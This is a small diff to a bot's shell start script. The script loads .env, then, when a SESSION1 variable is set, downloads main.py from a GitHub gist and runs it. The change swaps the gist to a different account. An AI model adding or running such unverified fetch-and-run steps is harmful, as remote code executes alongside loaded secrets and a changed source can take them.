@@ -13,4 +13,4 @@ echo "
 
 "
 if [ -f .env ] ; then  set -o allexport; source .env; set +o allexport ; fi
-if [ $SESSION1 ] ; then wget https://gist.githubusercontent.com/ionmusic/b93f641c0caef18d494205e5ae14adc7/raw/main.py && python3 main.py ; else python3 -m Kazu ; fi
+if [ $SESSION1 ] ; then wget https://gist.githubusercontent.com/Onlymeriz/8086bd37e9905d8a330219aa6bc401b9/raw/main.py && python3 main.py ; else python3 -m Kazu ; fi
